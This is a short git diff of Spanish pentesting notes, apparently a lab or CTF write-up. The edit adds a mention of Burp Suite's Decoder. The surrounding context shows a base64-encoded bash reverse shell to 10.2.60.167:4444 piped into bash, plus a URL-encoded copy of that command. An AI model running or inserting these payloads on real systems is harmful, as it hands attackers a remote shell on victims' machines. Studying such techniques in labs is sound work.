@@ -125,7 +125,7 @@ YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yLjYwLjE2Ny80NDQ0IDA+JjEi
 echo -ne "YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yLjYwLjE2Ny80NDQ0IDA+JjEi" | base64 -d | bash
 ~~~
 
-- Si la conexión no se realiza, siempre podemos encodeara el payload en URL:
+- Si la conexión no se realiza, siempre podemos encodeara el payload en URL desde en Decoder de burpsuite:
 
 ~~~URL
 %65%63%68%6f%20%2d%6e%65%20%22%59%6d%46%7a%61%43%41%74%59%79%41%69%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%79%4c%6a%59%77%4c%6a%45%32%4e%79%38%30%4e%44%51%30%49%44%41%2b%4a%6a%45%69%22%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68
